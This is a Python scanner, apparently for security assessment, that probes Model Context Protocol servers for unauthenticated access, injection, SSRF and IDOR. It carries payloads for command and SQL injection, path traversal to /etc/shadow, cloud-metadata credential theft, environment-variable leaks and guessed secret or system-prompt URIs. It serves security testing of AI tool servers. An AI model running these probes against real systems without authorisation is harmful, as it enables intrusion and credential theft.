"""
MCP Honeypot Tester - Enumerate and test access to Model Context Protocol servers.

Tests for:
- Unauthenticated tool/resource/prompt enumeration
- Tool invocation without authorization
- SSRF via resource URIs
- Injection via tool arguments
- IDOR on resources
- Capability escalation

Usage:
    python mcp_tester.py --target http://localhost:3000/mcp
    python mcp_tester.py --target http://localhost:3000/mcp --sse
    python mcp_tester.py --target http://localhost:3000/mcp --auth "Bearer token123"
"""
import sys
import json
import time
import uuid
import argparse
from datetime import datetime
from pathlib import Path

import httpx


class MCPTester:
    def __init__(self, target_url, auth_header=None, use_sse=False, proxy=None, delay=1):
        self.target = target_url.rstrip("/")
        self.auth_header = auth_header
        self.use_sse = use_sse
        self.delay = delay
        self.results = []
        self.tools = []
        self.resources = []
        self.prompts = []
        self.server_info = {}

        client_kwargs = {"timeout": 30, "verify": False}
        if proxy:
            client_kwargs["proxy"] = proxy
        self.client = httpx.Client(**client_kwargs)

    def _headers(self):
        h = {"Content-Type": "application/json"}
        if self.auth_header:
            h["Authorization"] = self.auth_header
        return h

    def _jsonrpc(self, method, params=None, id=None):
        """Build a JSON-RPC 2.0 request."""
        msg = {"jsonrpc": "2.0", "method": method, "id": id or str(uuid.uuid4())}
        if params:
            msg["params"] = params
        return msg

    def _send(self, payload):
        """Send JSON-RPC request and return parsed response."""
        try:
            resp = self.client.post(self.target, json=payload, headers=self._headers())
            return {"status": resp.status_code, "body": resp.text, "parsed": self._parse(resp)}
        except Exception as e:
            return {"status": 0, "body": "", "error": str(e)}

    def _send_no_auth(self, payload):
        """Send without auth header to test unauthenticated access."""
        h = {"Content-Type": "application/json"}
        try:
            resp = self.client.post(self.target, json=payload, headers=h)
            return {"status": resp.status_code, "body": resp.text, "parsed": self._parse(resp)}
        except Exception as e:
            return {"status": 0, "body": "", "error": str(e)}

    def _parse(self, resp):
        try:
            return resp.json()
        except:
            return None

    def _record(self, test_id, name, category, result, finding=None):
        entry = {
            "id": test_id, "name": name, "category": category,
            "status": result.get("status"), "finding": finding,
            "response_preview": result.get("body", "")[:500]
        }
        self.results.append(entry)
        if finding:
            print("  [!!!] %s" % finding)
        return entry

    # ================================================================
    # PHASE 1: INITIALIZATION & ENUMERATION
    # ================================================================

    def test_initialize(self):
        """Attempt MCP handshake to get server capabilities."""
        print("\n[PHASE 1] Initialization & Capability Discovery")
        print("-" * 60)

        payload = self._jsonrpc("initialize", {
            "protocolVersion": "2025-03-26",
            "capabilities": {"roots": {"listChanged": True}, "sampling": {}},
            "clientInfo": {"name": "aicu-mcp-tester", "version": "1.0.0"}
        })

        print("  [INIT] Sending initialize handshake...")
        result = self._send(payload)

        if result.get("parsed") and "result" in result["parsed"]:
            self.server_info = result["parsed"]["result"]
            caps = self.server_info.get("capabilities", {})
            info = self.server_info.get("serverInfo", {})
            print("  [OK] Server: %s v%s" % (info.get("name", "unknown"), info.get("version", "?")))
            print("  [OK] Capabilities: %s" % json.dumps(caps, indent=2)[:300])
            self._record("INIT-001", "Initialize handshake", "recon", result,
                         "Server responded to initialize - capabilities exposed")
            return True
        elif result.get("status") == 401 or result.get("status") == 403:
            print("  [BLOCKED] Auth required (HTTP %d)" % result["status"])
            self._record("INIT-001", "Initialize handshake", "recon", result)
            return False
        else:
            print("  [?] HTTP %s - %s" % (result.get("status"), result.get("body", "")[:200]))
            self._record("INIT-001", "Initialize handshake", "recon", result)
            return result.get("status") == 200

    def test_initialize_no_auth(self):
        """Try initialize without credentials."""
        print("  [INIT] Testing without auth...")
        payload = self._jsonrpc("initialize", {
            "protocolVersion": "2025-03-26",
            "capabilities": {},
            "clientInfo": {"name": "anonymous-probe", "version": "0.0.1"}
        })
        result = self._send_no_auth(payload)
        if result.get("parsed") and "result" in result["parsed"]:
            self._record("INIT-002", "Unauthenticated initialize", "auth_bypass", result,
                         "CRITICAL: Server accepts unauthenticated initialize!")
        else:
            print("  [OK] Unauthenticated initialize rejected")
            self._record("INIT-002", "Unauthenticated initialize", "auth_bypass", result)

    # ================================================================
    # PHASE 2: TOOL ENUMERATION
    # ================================================================

    def test_enumerate_tools(self):
        """List all available tools."""
        print("\n[PHASE 2] Tool Enumeration")
        print("-" * 60)

        payload = self._jsonrpc("tools/list")
        print("  [ENUM] Listing tools...")
        result = self._send(payload)

        if result.get("parsed") and "result" in result["parsed"]:
            tools = result["parsed"]["result"].get("tools", [])
            self.tools = tools
            print("  [OK] Found %d tools:" % len(tools))
            for t in tools:
                print("    - %s: %s" % (t.get("name"), t.get("description", "")[:60]))
            self._record("ENUM-001", "Tool enumeration", "recon", result,
                         "Enumerated %d tools" % len(tools) if tools else None)
        else:
            print("  [BLOCKED] Could not list tools (HTTP %s)" % result.get("status"))
            self._record("ENUM-001", "Tool enumeration", "recon", result)

        time.sleep(self.delay)

        # Try without auth
        print("  [ENUM] Listing tools without auth...")
        result = self._send_no_auth(payload)
        if result.get("parsed") and "result" in result["parsed"]:
            tools = result["parsed"]["result"].get("tools", [])
            if tools:
                self._record("ENUM-002", "Unauthenticated tool enumeration", "auth_bypass", result,
                             "CRITICAL: %d tools exposed without auth!" % len(tools))
        else:
            print("  [OK] Unauthenticated tool listing rejected")
            self._record("ENUM-002", "Unauthenticated tool enumeration", "auth_bypass", result)

    def test_enumerate_resources(self):
        """List all available resources."""
        print("\n  [ENUM] Listing resources...")
        payload = self._jsonrpc("resources/list")
        result = self._send(payload)

        if result.get("parsed") and "result" in result["parsed"]:
            resources = result["parsed"]["result"].get("resources", [])
            self.resources = resources
            print("  [OK] Found %d resources:" % len(resources))
            for r in resources:
                print("    - %s (%s)" % (r.get("uri", "?"), r.get("name", "")))
            self._record("ENUM-003", "Resource enumeration", "recon", result,
                         "Enumerated %d resources" % len(resources) if resources else None)
        else:
            print("  [BLOCKED] Could not list resources")
            self._record("ENUM-003", "Resource enumeration", "recon", result)

    def test_enumerate_prompts(self):
        """List all available prompts."""
        print("  [ENUM] Listing prompts...")
        payload = self._jsonrpc("prompts/list")
        result = self._send(payload)

        if result.get("parsed") and "result" in result["parsed"]:
            prompts = result["parsed"]["result"].get("prompts", [])
            self.prompts = prompts
            print("  [OK] Found %d prompts:" % len(prompts))
            for p in prompts:
                print("    - %s: %s" % (p.get("name"), p.get("description", "")[:60]))
            self._record("ENUM-004", "Prompt enumeration", "recon", result,
                         "Enumerated %d prompts" % len(prompts) if prompts else None)
        else:
            print("  [BLOCKED] Could not list prompts")
            self._record("ENUM-004", "Prompt enumeration", "recon", result)

    # ================================================================
    # PHASE 3: ACCESS TESTING
    # ================================================================

    def test_tool_invocation(self):
        """Try invoking each discovered tool."""
        if not self.tools:
            print("\n[PHASE 3] Tool Invocation - skipped (no tools found)")
            return

        print("\n[PHASE 3] Tool Invocation Testing")
        print("-" * 60)

        for tool in self.tools[:5]:  # Limit to first 5 to avoid rate limits
            name = tool.get("name", "unknown")
            schema = tool.get("inputSchema", {})

            # Build minimal valid arguments from schema
            args = self._build_test_args(schema)

            print("  [CALL] Invoking '%s' with test args..." % name)
            payload = self._jsonrpc("tools/call", {"name": name, "arguments": args})
            result = self._send(payload)

            if result.get("parsed") and "result" in result["parsed"]:
                content = result["parsed"]["result"].get("content", [])
                is_error = result["parsed"]["result"].get("isError", False)
                if not is_error:
                    self._record("CALL-%s" % name, "Tool invocation: %s" % name, "access", result,
                                 "Tool '%s' executed successfully" % name)
                else:
                    print("  [OK] Tool returned error (expected for test args)")
                    self._record("CALL-%s" % name, "Tool invocation: %s" % name, "access", result)
            elif result.get("status") in (401, 403):
                print("  [BLOCKED] Auth required for tool call")
                self._record("CALL-%s" % name, "Tool invocation: %s" % name, "access", result)
            else:
                print("  [?] HTTP %s" % result.get("status"))
                self._record("CALL-%s" % name, "Tool invocation: %s" % name, "access", result)

            time.sleep(self.delay)

        # Try calling without auth
        if self.tools:
            tool = self.tools[0]
            print("  [CALL] Invoking '%s' WITHOUT auth..." % tool["name"])
            payload = self._jsonrpc("tools/call", {"name": tool["name"], "arguments": {}})
            result = self._send_no_auth(payload)
            if result.get("parsed") and "result" in result["parsed"]:
                if not result["parsed"]["result"].get("isError"):
                    self._record("CALL-NOAUTH", "Unauthenticated tool call", "auth_bypass", result,
                                 "CRITICAL: Tool '%s' callable without auth!" % tool["name"])
            else:
                print("  [OK] Unauthenticated tool call rejected")
                self._record("CALL-NOAUTH", "Unauthenticated tool call", "auth_bypass", result)

    def test_resource_access(self):
        """Try reading each discovered resource."""
        if not self.resources:
            return

        print("\n[PHASE 3b] Resource Access Testing")
        print("-" * 60)

        for res in self.resources[:5]:
            uri = res.get("uri", "")
            print("  [READ] Accessing resource: %s" % uri)
            payload = self._jsonrpc("resources/read", {"uri": uri})
            result = self._send(payload)

            if result.get("parsed") and "result" in result["parsed"]:
                contents = result["parsed"]["result"].get("contents", [])
                self._record("RES-%s" % uri[:20], "Resource read: %s" % uri, "access", result,
                             "Resource accessible: %s" % uri)
            else:
                print("  [BLOCKED] Cannot read resource")
                self._record("RES-%s" % uri[:20], "Resource read: %s" % uri, "access", result)

            time.sleep(self.delay)

    # ================================================================
    # PHASE 4: INJECTION & SSRF TESTING
    # ================================================================

    def test_injection(self):
        """Test for injection via tool arguments."""
        if not self.tools:
            print("\n[PHASE 4] Injection Testing - skipped (no tools found)")
            return

        print("\n[PHASE 4] Injection & SSRF Testing")
        print("-" * 60)

        injection_payloads = [
            {"id": "INJ-001", "name": "Command injection in arg",
             "args": {"input": "test; cat /etc/passwd", "query": "'; DROP TABLE users; --"}},
            {"id": "INJ-002", "name": "SSRF via URL arg",
             "args": {"url": "http://169.254.169.254/latest/meta-data/", "endpoint": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}},
            {"id": "INJ-003", "name": "Path traversal in arg",
             "args": {"file": "../../../etc/passwd", "path": "/mnt/data/../../etc/shadow"}},
            {"id": "INJ-004", "name": "SSRF via file:// scheme",
             "args": {"url": "file:///etc/passwd", "source": "file:///proc/self/environ"}},
            {"id": "INJ-005", "name": "Template injection",
             "args": {"template": "{{7*7}}", "input": "${env:AWS_SECRET_ACCESS_KEY}"}},
        ]

        target_tool = self.tools[0]["name"]

        for inj in injection_payloads:
            print("  [INJ] %s on tool '%s'..." % (inj["name"], target_tool))
            payload = self._jsonrpc("tools/call", {"name": target_tool, "arguments": inj["args"]})
            result = self._send(payload)

            body = result.get("body", "")
            sensitive = any(x in body for x in ["root:", "AWS_SECRET", "AKIA", "ami-", "169.254", "49"])

            if sensitive:
                self._record(inj["id"], inj["name"], "injection", result,
                             "CRITICAL: Sensitive data in response!")
            else:
                print("  [OK] No sensitive data leaked")
                self._record(inj["id"], inj["name"], "injection", result)

            time.sleep(self.delay)

    def test_ssrf_via_resources(self):
        """Try reading resources with SSRF URIs."""
        print("\n  [SSRF] Testing resource read with malicious URIs...")

        ssrf_uris = [
            "file:///etc/passwd",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://127.0.0.1:6379/INFO",
            "file:///proc/self/environ",
        ]

        for uri in ssrf_uris:
            payload = self._jsonrpc("resources/read", {"uri": uri})
            result = self._send(payload)

            body = result.get("body", "")
            if result.get("status") == 200 and ("root:" in body or "AWS" in body or "redis" in body.lower()):
                self._record("SSRF-%s" % uri[:15], "SSRF via resource read", "ssrf", result,
                             "CRITICAL: SSRF confirmed - %s" % uri)
            else:
                print("  [OK] %s - blocked or no data" % uri[:40])
                self._record("SSRF-%s" % uri[:15], "SSRF via resource read", "ssrf", result)

            time.sleep(self.delay)

    # ================================================================
    # PHASE 5: IDOR & ESCALATION
    # ================================================================

    def test_idor(self):
        """Test for IDOR by accessing resources with manipulated identifiers."""
        print("\n[PHASE 5] IDOR & Privilege Escalation")
        print("-" * 60)

        # Try accessing resources with guessed/manipulated URIs
        idor_uris = [
            "file:///admin/config.json",
            "db://users/1",
            "db://users/0",
            "secret://api-keys",
            "internal://system-prompt",
            "config://credentials",
        ]

        for uri in idor_uris:
            print("  [IDOR] Trying: %s" % uri)
            payload = self._jsonrpc("resources/read", {"uri": uri})
            result = self._send(payload)

            if result.get("parsed") and "result" in result["parsed"]:
                self._record("IDOR-%s" % uri[:15], "IDOR: %s" % uri, "idor", result,
                             "Resource accessible: %s" % uri)
            else:
                self._record("IDOR-%s" % uri[:15], "IDOR: %s" % uri, "idor", result)

            time.sleep(self.delay)

    # ================================================================
    # HELPERS
    # ================================================================

    def _build_test_args(self, schema):
        """Build minimal test arguments from a JSON schema."""
        args = {}
        props = schema.get("properties", {})
        required = schema.get("required", [])

        for key, prop in props.items():
            ptype = prop.get("type", "string")
            if ptype == "string":
                args[key] = "test"
            elif ptype == "number" or ptype == "integer":
                args[key] = 1
            elif ptype == "boolean":
                args[key] = True
            elif ptype == "array":
                args[key] = []
            elif ptype == "object":
                args[key] = {}

        return args

    # ================================================================
    # MAIN RUNNER
    # ================================================================

    def run_all(self):
        print("=" * 70)
        print("  MCP Honeypot Tester v1.0.0")
        print("  Target: %s" % self.target)
        print("  Auth: %s" % ("Yes" if self.auth_header else "None"))
        print("  Started: %s" % datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        print("=" * 70)

        # Phase 1
        connected = self.test_initialize()
        self.test_initialize_no_auth()
        time.sleep(self.delay)

        # Phase 2
        self.test_enumerate_tools()
        time.sleep(self.delay)
        self.test_enumerate_resources()
        time.sleep(self.delay)
        self.test_enumerate_prompts()
        time.sleep(self.delay)

        # Phase 3
        self.test_tool_invocation()
        time.sleep(self.delay)
        self.test_resource_access()
        time.sleep(self.delay)

        # Phase 4
        self.test_injection()
        time.sleep(self.delay)
        self.test_ssrf_via_resources()
        time.sleep(self.delay)

        # Phase 5
        self.test_idor()

        # Summary
        self._print_summary()
        self._save_results()

    def _print_summary(self):
        print("\n" + "=" * 70)
        print("  SCAN COMPLETE")
        print("=" * 70)

        findings = [r for r in self.results if r.get("finding")]
        critical = [r for r in findings if "CRITICAL" in (r.get("finding") or "")]

        print("  Total tests: %d" % len(self.results))
        print("  Findings: %d" % len(findings))
        print("  Critical: %d" % len(critical))
        print("")

        if findings:
            print("  FINDINGS:")
            for f in findings:
                severity = "CRITICAL" if "CRITICAL" in f["finding"] else "INFO"
                print("    [%s] %s - %s" % (severity, f["id"], f["finding"]))

        print("=" * 70)

    def _save_results(self):
        out_dir = Path("runs") / ("mcp_scan_%s" % datetime.now().strftime("%Y%m%d_%H%M%S"))
        out_dir.mkdir(parents=True, exist_ok=True)
        (out_dir / "results.json").write_text(json.dumps(self.results, indent=2), encoding="utf-8")
        (out_dir / "server_info.json").write_text(json.dumps(self.server_info, indent=2), encoding="utf-8")
        (out_dir / "tools.json").write_text(json.dumps(self.tools, indent=2), encoding="utf-8")
        (out_dir / "resources.json").write_text(json.dumps(self.resources, indent=2), encoding="utf-8")
        print("  Results saved: %s" % out_dir)


def main():
    parser = argparse.ArgumentParser(description="MCP Honeypot Tester - Enumerate and test MCP servers")
    parser.add_argument("--target", required=True, help="MCP server URL (e.g., http://localhost:3000/mcp)")
    parser.add_argument("--auth", help="Authorization header value (e.g., 'Bearer token123')")
    parser.add_argument("--sse", action="store_true", help="Use SSE transport")
    parser.add_argument("--proxy", help="HTTP proxy (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--delay", type=int, default=1, help="Delay between requests in seconds")
    args = parser.parse_args()

    tester = MCPTester(args.target, auth_header=args.auth, use_sse=args.sse,
                       proxy=args.proxy, delay=args.delay)
    tester.run_all()


if __name__ == "__main__":
    main()
